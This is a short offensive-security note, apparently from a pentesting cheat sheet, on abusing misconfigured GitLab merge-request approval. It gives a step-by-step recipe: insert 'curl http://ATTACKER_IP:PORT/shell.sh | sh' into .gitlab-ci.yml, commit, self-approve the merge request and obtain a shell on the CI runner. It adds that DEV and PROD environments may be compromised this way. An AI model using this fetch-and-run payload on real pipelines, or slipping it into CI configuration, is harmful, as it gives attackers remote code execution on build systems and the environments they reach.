## TIP: Depending on the context the runner is running, you may even compromise DEV and PROD environments respectively.

# MISCONFIGURED ACCESS GATES

## EXAMPLE:

#### 1) Update the .gitlab-ci.yml file with "curl http://ATTACKER_IP:PORT/shell.sh | sh" on the script paragraph.

#### 2) Commit changes

#### 3) Create merge request

#### 4) Approval is OPTIONAL (Obviously this is a logic flaw of Gitlab) so we can approve our own merge requests without restrictions

#### 5) Enjoy your shell
